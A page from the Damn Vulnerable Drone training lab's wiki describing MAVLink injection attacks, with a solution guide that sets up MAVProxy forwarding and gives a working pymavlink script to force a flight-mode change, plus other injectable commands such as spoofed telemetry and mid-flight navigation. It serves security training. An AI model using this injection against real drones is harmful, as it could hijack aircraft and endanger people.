<i>Manipulating MAVLink messages to alter the behavior of a drone.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Injection > MAVLink Injection Attack

# Description

A MAVLink injection attack involves intercepting and injecting malicious MAVLink messages into the communication between a drone and its ground control station. This can be used to alter the behavior of the drone — including changing flight modes, issuing command overrides, injecting telemetry, or redirecting navigation.

MAVLink is a lightweight message protocol used by most modern drones, and in many systems it lacks authentication or message signing, making it susceptible to injection.

# Resources

- <a href="https://mavlink.io/en/">MAVLink</a>  
- <a href="https://github.com/ArduPilot/MAVProxy">MAVProxy</a>  

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Install MAVProxy</h3>

<pre><code class="code mb-3 mt-3">sudo apt-get install python3-dev python3-opencv python3-wxgtk4.0 \
python3-pip python3-matplotlib python3-lxml python3-pygame

pip3 install PyYAML mavproxy --user
echo 'export PATH="$PATH:$HOME/.local/bin"' >> ~/.bashrc
</code></pre>

---

<h3>Step 2. Connect to the Drone</h3>

Use one of the following methods depending on your setup:

**Serial:**
<pre><code class="code mb-3 mt-3">mavproxy.py --master=/dev/ttyUSB0 --baudrate 57600 --aircraft MyAircraft
</code></pre>

**UDP:**
<pre><code class="code mb-3 mt-3">mavproxy.py --master=udp:127.0.0.1:14550
</code></pre>

---

<h3>Step 3. Set Up Forwarding for Message Injection</h3>

<pre><code class="code mb-3 mt-3">mavproxy.py --master=udp:127.0.0.1:14550 --out=udp:127.0.0.1:14551
</code></pre>

This allows MAVProxy to forward injected commands from another port to the live drone connection.

---

<h3>Step 4. Inject MAVLink Messages Using pymavlink</h3>

Save this example script as <code>inject_mode_change.py</code>:

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil

# Connect to the forwarding port
master = mavutil.mavlink_connection('udp:127.0.0.1:14550')
master.wait_heartbeat()
print("[+] Connected to drone")

# Change mode using COMMAND_LONG
master.mav.command_long_send(
    1, 1,  # target system, target component
    mavutil.mavlink.MAV_CMD_DO_SET_MODE,
    0,
    1, 0, 4,  # param1: base_mode=1, param2: unused, param3: custom_mode=4 (GUIDED)
    0, 0, 0, 0
)

print("[!] Sent mode change command")
</code></pre>

---

<h3>Effect</h3>

You can use this method to inject arbitrary MAVLink commands into the drone’s message stream, such as:

- Change to GUIDED or LOITER mode  
- Trigger Return-to-Launch (RTL)  
- Inject spoofed telemetry (e.g., GPS, battery)  
- Send `MISSION_ITEM` or `SET_POSITION_TARGET_GLOBAL_INT` commands mid-flight

</details>
